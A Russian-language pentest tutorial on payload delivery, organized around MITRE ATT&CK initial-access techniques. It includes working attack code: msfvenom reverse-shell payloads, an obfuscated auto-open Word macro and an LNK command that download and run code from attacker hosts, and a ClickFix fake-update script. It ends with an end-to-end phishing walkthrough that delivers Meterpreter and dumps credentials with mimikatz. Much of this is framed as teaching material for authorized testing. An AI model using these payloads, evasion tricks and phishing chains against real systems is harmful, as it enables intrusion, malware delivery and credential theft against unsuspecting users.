# Доставка пейлоада: методы, механизмы и применение в пентесте

## 1. Пейлоад, эксплойт и вектор: ключевые понятия доставки

Под **пейлоадом** (payload) в контексте пентеста понимается исполняемый код, который должен быть передан на целевую систему и выполнен для достижения цели атакующего: управление, кража данных, развёртывание дополнительного инструментария. Термин тесно связан с этапом *Initial Access* (тактика TA0001 в [MITRE ATT&CK](https://attack.mitre.org/tactics/TA0001/)), однако важно разграничить смежные понятия: сам начальный доступ — это способ проникнуть в среду (например, фишинг, эксплуатация уязвимости, использование скомпрометированных учётных данных), тогда как **доставка пейлоада** — конкретный механизм передачи вредоносного кода на целевой узел и его запуск. Одна и та же техника начального доступа может использовать различные подходы к доставке; и наоборот, один способ доставки может применяться в нескольких техниках.

Основные определения:

- **Пейлоад** — функциональная часть вредоносного ПО, выполняющая целевое действие: reverse shell, загрузка второго этапа (stage), шифрование файлов, кража cookies, установка бэкдора.
- **Эксплойт** — фрагмент кода или данных, использующий уязвимость для получения контроля (например, переполнение буфера, инъекция команд). Эксплойт часто *доставляет* пейлоад, но может быть и самостоятельным.
- **Вектор доставки** — канал или метод передачи пейлоада: вложение электронной почты, URL-ссылка, общий сетевой ресурс, внедрение через MITM, физический носитель.
- **Стадия (stager)** — компактный пейлоад, который не содержит всей функциональности, а только устанавливает соединение и загружает основную часть (stage). Бесстадийные (stageless) пейлоады, напротив, включают всё необходимое сразу.

Связь этих понятий иллюстрируется таблицей:

| Компонент | Что делает | Пример использования | Характерный артефакт |
|-----------|------------|---------------------|-----------------------|
| Вектор начального доступа (Initial Access) | Обеспечивает «точку входа» | Фишинговая рассылка с вложением, эксплуатация RCE в веб-приложении | Лог SMTP-сервера, HTTP-запрос с эксплойтом |
| Эксплойт | Использует уязвимость для выполнения кода или повышения привилегий | Эксплойт для CVE-2021-44228 (Log4Shell), EternalBlue | Сетевой пакет с полезной нагрузкой, шелл-код |
| Пейлоад (первичный) | Непосредственный вредоносный код, исполняемый после успешного эксплойта или макроса | Обратный шелл, загрузчик Meterpreter, шифровальщик | Исполняемый файл, скрипт PowerShell, макрос VBA |
| Механизм доставки | Способ физической или логической транспортировки пейлоада на хост | Вложение .docm, ссылка на SMB-шар, drive-by-загрузка с JavaScript | EMl-файл письма, запись логов прокси, объект OLE в документе |

Различие между техниками доставки важно для пентестера: не всегда удаётся просто прикрепить файл к письму — современные системы фильтрации проверяют вложения, песочницы анализируют поведение, а EDR-агенты блокируют подозрительные цепочки запуска. Поэтому доставка пейлоада сегодня — это многоэтапный процесс с использованием обфускации, сокрытия и методов обхода защит.

**Типичная цепочка доставки пейлоада в современной атаке:**
1. Выбор вектора (e-mail, веб, социальная инженерия).
2. Формирование контейнера (документ Office, ISO-архив, HTML-приложение).
3. Размещение первичного кода (макрос, JavaScript, LNK-файл).
4. Выполнение скрипта-загрузчика (PowerShell, WScript, mshta) для обхода ограничений.
5. Загрузка и запуск основного пейлоада или рефлективная загрузка сборки в память.

Ниже показан простейший пример генерации бесстадийного пейлоада обратного оболочки утилитой `msfvenom`:

```bash
# Генерация stageless reverse TCP Meterpreter для Windows
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
```

Этот файл нужно доставить на целевую машину и запустить. Уже на этом уровне пентестер выбирает метод доставки: передача через фишинг, загрузка через PowerShell одной строкой, внедрение в легитимный установщик и пр. Принципиально важно, что современные защиты обращают внимание не только на сам пейлоад, но и на события его получения — отслеживают источники загрузок (Mark-of-the-Web, Zone.Identifier), проверяют цепочки родительских процессов.

Таким образом, доставка пейлоада — не изолированное действие, а центральный элемент всего сценария начального доступа, определяющий скрытность и надёжность компрометации.

## 2. Классификация методов доставки и их внутреннее устройство

Техники доставки пейлоада удобно рассматривать через призму тактики **Initial Access** матрицы MITRE ATT&CK. Версия Enterprise содержит одиннадцать техник (по состоянию на 2025 год), каждая из которых подразумевает определённый механизм передачи и запуска вредоносного кода. Ниже представлена сводная таблица ключевых техник, сгруппированных по характеру доставки.

| Техника ID | Название | Тип доставки | Типичный контейнер/канал | Примеры доставляемых пейлоадов |
|------------|----------|--------------|---------------------------|--------------------------------|
| T1566 | Фишинг (Phishing) | Электронная почта, мессенджеры | Вложение (docm, xlsm, iso, lnk), ссылка | Загрузчик PowerShell, HTA-приложение, исполняемый файл в архиве |
| T1189 | Drive-by Compromise | Веб-сайт | Вредоносный JavaScript/iframe на скомпрометированной странице | Эксплойт-пакет (RIG, Fallout) с шелл-кодом, загрузка трояна через браузерную уязвимость |
| T1190 | Эксплуатация публично доступных приложений | Сетевой сервис | HTTP-запрос, RDP, SMB, VPN | Пейлоад в виде команды ОС (reverse shell) или загружаемого файла через уязвимость (например, десериализация) |
| T1133 | Внешние удалённые сервисы | VPN, Citrix, RDP | Прямое подключение с действительными учётными данными | Бэкдор, средства удалённого управления (RAT), скрипт, запускаемый через задачу |
| T1195 | Компрометация цепочки поставок (Supply Chain Compromise) | Обновления ПО, библиотеки | Модифицированный установщик, пакет npm/pip, прошивка | Бэкдор, шифровальщик, загрузчик второго этапа |
| T1200 | Аппаратные дополнения (Hardware Additions) | Физический доступ | USB-устройство, Raspberry Pi, сетевой модуль | Автозапускаемый исполняемый файл (BadUSB), кейлоггер |
| T1091 | Репликация через сменные носители (Replication Through Removable Media) | USB-накопители, внешние диски | Autorun.inf, LNK-файл | Червь, троян, запускаемый при подключении |
| T1566.001 | Phishing: Spearphishing Attachment | Электронная почта | Документ Office, PDF, архив | Макрос VBA, эксплойт для CVE-2017-11882 (Equation Editor) |
| T1566.002 | Phishing: Spearphishing Link | Электронная почта, соц.сети | URL-ссылка на поддельный сайт или на файл на облачном хранилище | Загрузка вредоносного файла после клика, имитация входа с последующей загрузкой |
| T1659 | Content Injection | Сетевой трафик | Перехват и модификация ответов HTTP (MITM) | Внедрение iframe для drive-by, замена скачиваемого файла трояном |
| T1187 | Принудительная аутентификация (Forced Authentication) | Сетевые протоколы NTLM | Поддельный SMB-сервер, WebDAV | Перехват NetNTLM-хеша (не пейлоад, но может использоваться для Relay-атак с дальнейшей доставкой) |

Каждая техника имеет более детальные подтехники (sub-techniques), которые уточняют механизм. Например, фишинг разделяется на вложение (T1566.001), ссылку (T1566.002) и через сторонние сервисы (T1566.003). В пентесте выбор конкретного варианта определяется моделью угроз и доступными каналами взаимодействия с целью.

**Общая структура доставки с точки зрения атакующего**: можно выделить четыре логических слоя:

```text
[Контейнер] ----> [Доставочный механизм] ----> [Выполнение] ----> [Пейлоад]
  |                     |                        |                 |
  Документ, архив,      Способ попадания         Интерпретатор,    Вредоносный код
  ISO-образ, HTA,...    (email, web, USB)        скриптовый движок (EXE, DLL, скрипт)
```

Рассмотрим эти слои на примере одной из самых распространённых в пентесте техник — фишингового письма с документом, содержащим макрос. Контейнером выступает файл `.docm`. Доставочный механизм — SMTP-письмо с темой, имитирующей легитимную бизнес-коммуникацию. Выполнение инициируется пользователем (открытие документа и включение макросов), а фактическим исполнителем выступает VBA-интерпретатор офисного пакета. Пейлоад обычно представлен скриптом PowerShell, который обфусцирован и поэтапно загружает основную вредоносную нагрузку.

**Внутреннее устройство типового контейнера** демонстрирует следующий пример VBA-макроса, который обеспечивает загрузку и выполнение стагера:

```vba
Private Sub Document_Open()
    Dim strCommand As String
    strCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass " & _
                 "-NoProfile -Command ""IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stage.ps1')"""
    Shell strCommand, vbHide
End Sub
```

Этот код использует метод `Shell` для вызова PowerShell с загрузкой скрипта из внешнего источника. На практике столь простой макрос будет обнаружен антивирусным сканером и сигнатурным анализом. Пентестеры применяют обфускацию — изменение имён переменных, динамическую сборку строки, добавление мусорного кода, шифрование строк вызова.

Другой пример — контейнер в виде файла `.lnk` (ярлыка), доставляемого через архив. Ярлык содержит командную строку, ссылающуюся на системные утилиты:

```text
C:\Windows\System32\cmd.exe /c powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadFile('http://malicious.local/payload.exe', 'C:\Users\Public\p.exe'); Start-Process 'C:\Users\Public\p.exe'"
```

При двойном щелчке запускается PowerShell, который загружает исполняемый файл и запускает его. Современные атаки часто используют расширение `.iso` или `.img` для обхода Mark-of-the-Web, так как монтируемый образ не наследует метку безопасности NTFS.

Важно отметить, что доставка может осуществляться и вовсе без участия пользователя — например, через эксплуатацию уязвимости в веб-приложении. В этом случае сетевое подключение к уязвимому сервису само становится доставочным механизмом, а пейлоад внедряется напрямую в ответ или выполняется через команду ОС. Классический пример — эксплуатация уязвимости Apache Struts (CVE-2017-5638), где в заголовке `Content-Type` передаётся OGNL-выражение, приводящее к выполнению команды:

```http
POST /struts2-showcase/showcase.action HTTP/1.1
Host: target.local
Content-Type: %{(#n='multipart/form-data').(#cmd='cmd /c powershell -enc <Base64>')...}
```

Таким образом, доставка пейлоада может быть как пассивной (ожидание действия пользователя), так и активной (эксплуатация уязвимости). Понимание структуры конкретного вектора необходимо для выбора инструментов, обхода средств защиты и последующего тестирования устойчивости организации.

## 3. Практическое применение инструментов и тактик доставки в пентесте

В пентесте доставка пейлоада проверяет не только уязвимость технических средств, но и уровень осведомлённости пользователей, эффективность защитных мер (песочница писем, EDR, веб-фильтрация). Современный пентестер редко полагается на единственный метод; обычно готовится несколько сценариев с разными векторами и обходными путями.

**Типовой пайплайн подготовки доставки:**
1. **Разведка** — определяются используемые в организации почтовые клиенты, версии ОС, офисного пакета, защитные решения.
2. **Генерация пейлоада** — используется `msfvenom`, `Cobalt Strike`, `Mythic`, `Sliver`, `Empire`, или кастомные загрузчики.
3. **Обработка контейнера** — внедрение в офисные документы, создание HTA/CHM, сборка DLL, упаковка в ISO.
4. **Обфускация и уклонение** — применяются Veil, Shellter, ScareCrow, Ebowla для обхода AV/EDR; макросы обфусцируются вручную или через `MacroPack`, `Unicorn`.
5. **Настройка слушателя (listener)** — запуск multi/handler в Metasploit, HTTP/SMB-сервера для отдачи второго этапа, настройка C2-профиля для имитации легитимного трафика.
6. **Доставка** — рассылка через фишинговый фреймворк (GoPhish, King Phisher), ручная отправка, размещение на веб-сервере, эксплуатация уязвимости.
7. **Пост-эксплуатация** — после получения сессии следует стандартный цикл: закрепление, сбор информации, lateral movement.

Рассмотрим ключевые инструменты и команды, применяемые на этапе доставки.

**Создание пейлоада с `msfvenom`** — базовый, но показательный пример:

```bash
# Stageless обратный HTTPS Meterpreter с сертификатом для обхода инспекции трафика
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.1.100 LPORT=443 \
         HandlerSSLCert=./cert.pem StagerVerificationSSL=true \
         -f exe -o resume.exe
```

Альтернатива для генерации PowerShell-однострочника, который можно внедрить в макрос или команду:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 \
         -f psh-reflection -o stage.ps1
```

Полученный скрипт содержит рефлективную загрузку DLL Meterpreter в память, что позволяет избежать записи на диск. Именно такой скрипт часто служит вторым этапом в цепочке доставки.

**Внедрение в документ Word через шаблон VBA с обфускацией** демонстрирует следующий подход (сгенерирован c помощью `Out-Word.ps1` из набора Nishang):

```powershell
# Генерация документа с макросом (фрагмент команды)
Out-Word -PayloadURL "http://192.168.1.100/payload.exe" -Arguments "C:\Users\Public\payload.exe"
```

В результате создаётся `.docm`, открывающий при включении макросов PowerShell-загрузчик, который скачивает файл и запускает его.

**Современный тренд — ClickFix (paste-and-run)**. Эта техника доставки эксплуатирует пользователя, предлагая ему скопировать и выполнить команду в окне «Выполнить» (`Win+R`) или PowerShell. Опирается на манипуляцию с поддельными ошибками браузера, CAPTCHA. Пример подставного сообщения:

```text
<script>
document.body.innerHTML += '<div id="error-msg">Your browser needs an update. Press Win+R, paste the following command and hit Enter: <br/><pre>cmd /c powershell -Command "IEX (iwr -Uri http://malicious.local/payload.ps1 -UseBasicParsing)"</pre></div>';
</script>
```

Жертва, следуя инструкциям, выполняет вредоносную команду. С точки зрения доставки, здесь отсутствует контейнер в виде файла, что усложняет детектирование сигнатурным способом; защита полагается на контроль процессов-потомков и анализ командной строки.

**Обход Mark-of-the-Web с помощью контейнеров ISO/VHD** — ещё одна распространённая техника. Пейлоад упаковывается в ISO-образ, который при монтировании (двойной щелчок в Windows) показывает файлы без MOTW, и макросы в документах внутри образа могут запускаться без дополнительных предупреждений. Команда создания ISO в Linux (часть пайплайна пентестера):

```bash
mkisofs -J -R -l -o payload.iso /path/to/contents
```

Затем ISO доставляется как вложение или через ссылку на облачный диск.

**Использование готовых фреймворков типа GoPhish** автоматизирует доставку через электронную почту и отслеживание результатов. Конфигурация landing page и email-шаблона не является чистым кодом, но для пентестера важно уметь создавать реалистичные шаблоны, вставляя вредоносные ссылки или вложения с уникальными идентификаторами для отслеживания. Пример настройки кампании в GoPhish производится через веб-интерфейс, но возможен и экспорт JSON-конфигурации, например:

```json
{
  "name": "Q4 Security Awareness",
  "template": { "subject": "Urgent: Updated Company Policy", "html": "<html>...</html>" },
  "url": "http://phishbox.local/?rid={{.RId}}",
  "smtp": { "host": "smtp.office365.com:587", "from_email": "hr@company.com" },
  "launch_date": "2025-05-20T08:00:00Z",
  "groups": ["gid_employees"]
}
```

Это иллюстрирует, как автоматизация снижает рутинные операции и позволяет фокусироваться на обходе защит.

**Анализ и обход EDR** при доставке требует знания типичных детектируемых паттернов: родительский процесс WinWord запускает PowerShell с подозрительными аргументами, внезапная загрузка из интернета, запись исполняемого файла в пользовательскую папку и его запуск. Для уклонения пентестеры используют:

- **Инъекцию в доверенный процесс** (например, в `explorer.exe` через Shellcode-инъекцию из макроса вместо прямого вызова PowerShell).
- **LOLBins** (`mshta.exe`, `rundll32.exe`, `csc.exe`) для запуска кода.
- **Шифрование пейлоада** и разбиение на чанки, подгрузка через DNS-туннель.
- **Использование бесфайловых техник** — все действия в памяти.

Пример запуска скрипта VBS через `mshta` из макроса:

```vba
Shell "mshta.exe javascript:""...;new ActiveXObject('WScript.Shell').Run('cmd /c powershell -enc <Base64>')"""
```

Таким образом, арсенал пентестера охватывает множество комбинаций контейнеров, обфускаций и каналов доставки, что позволяет моделировать самые актуальные угрозы и адекватно оценивать защищённость.

## 4. Сквозной практический пример: фишинговая доставка Meterpreter через документ со встроенным макросом

**Исходные условия**  
Тест на проникновение для компании «ACME Corp». Разрешена симуляция фишинга на сотрудников отдела продаж. Внешний периметр защищён почтовым шлюзом, EDR на рабочих станциях Windows 10 22H2, Microsoft Defender с обновлёнными сигнатурами. Пентестер использует Kali Linux, Metasploit, офисный пакет для создания документа.

**Шаг 1: Генерация стагера Meterpreter с HTTPS**  
Цель — получить обратное соединение, которое будет имитировать HTTPS-трафик для обхода простых инспекций. Создаём stageless пейлоад:

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=phisher.local LPORT=443 \
         HandlerSSLCert=./acme_cert.pem StagerVerificationSSL=true \
         -f psh-reflection -o /var/www/html/stage.ps1
```

Вывод: файл `stage.ps1` содержит PowerShell-скрипт для рефлективной загрузки Meterpreter в память.

**Шаг 2: Создание документа Word с обфусцированным макросом-загрузчиком**  
Используем PowerShell-утилиту `Out-Word` из пакета Nishang для генерации документа:

```powershell
Import-Module .\Out-Word.ps1
Out-Word -PayloadURL "http://phisher.local/stage.ps1" -Arguments "" -OutputFile "Sales_Report.docm"
```

В результате получаем файл `Sales_Report.docm`, содержащий следующий авто-открываемый макрос (фрагмент после ручной доработки для обхода базового статического анализа):

```vba
Private Sub Document_Open()
    On Error Resume Next
    Dim v: v = "p" + "o" + "w" + "e" + "r" + "s" + "h" + "e" + "l" + "l" + ".e" + "x" + "e"
    Dim a: a = "-W" + "in" + "d" + "ow" + "S" + "tyle" + " Hi" + "dde" + "n -E" + "xec" + "uti" + "onP" + "olicy By" + "pass -NoPro" + "file -Command"
    Dim c: c = "IEX (New-Object Net.WebClient).DownloadString('http://phisher.local/stage.ps1')"
    Dim cmd: cmd = v & " " & a & " """ & c & """"
    Shell cmd, vbHide
End Sub
```

Макрос собирает строки динамически, чтобы избежать простых сигнатур. При открытии документа и разрешении макросов происходит вызов PowerShell, который загружает и выполняет стадию подготовки Meterpreter.

**Шаг 3: Настройка слушателя и отправка фишингового письма**  
На Kali запускаем Metasploit listener:

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST phisher.local
set LPORT 443
set HandlerSSLCert /root/acme_cert.pem
set StagerVerificationSSL true
run -j
```

Письмо отправляется через предварительно настроенный SMTP-клиент или GoPhish. Используем шаблон письма, якобы от финансового отдела, с прикреплённым `Sales_Report.docm`. Поле `Subject: Urgent: Updated Sales Figures Q2`.

**Шаг 4: Жертва открывает документ, срабатывает макрос**  
Сотрудник отдела продаж получает письмо, скачивает вложение и открывает его. Поскольку файл получен из интернета, срабатывает защита Mark-of-the-Web — Word открывается в защищённом режиме с предупреждением. Однако макрос всё равно может быть выполнен, если пользователь нажмёт «Включить содержимое». После этого выполняется макрос → PowerShell загружает скрипт с `phisher.local`. В консоли Metasploit появляется:

```text
[*] Meterpreter session 1 opened (phisher.local:443 -> 10.0.0.45:54221) at 2025-05-20 10:05:23 -0400
meterpreter > sysinfo
Computer        : SALES-PC
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : ACME
Logged On Users : 2
Meterpreter     : x64/windows
```

**Шаг 5: Первичная пост-эксплуатация и демонстрация контроля**  
Пентестер выполняет несколько команд для демонстрации возможностей:

```bash
meterpreter > getuid
Server username: ACME\j.smith
meterpreter > ps
... список процессов ...
meterpreter > upload /root/tools/mimikatz.exe C:\\Users\\Public\\m.exe
meterpreter > execute -f m.exe -i -H
```

После выполнения mimikatz извлекаются учётные данные, что показывает критический риск.

**Ожидаемый вывод примера**  
Пример демонстрирует полный цикл доставки пейлоада от создания обфусцированного контейнера до успешной компрометации рабочей станции, несмотря на наличие базовых средств защиты. Он иллюстрирует, что даже современные EDR могут быть обойдены при сочетании социальной инженерии, бесфайлового выполнения и шифрованного C2-канала. Для пентестера такой сценарий служит основой для оценки эффективности защитных мер и программ обучения пользователей.
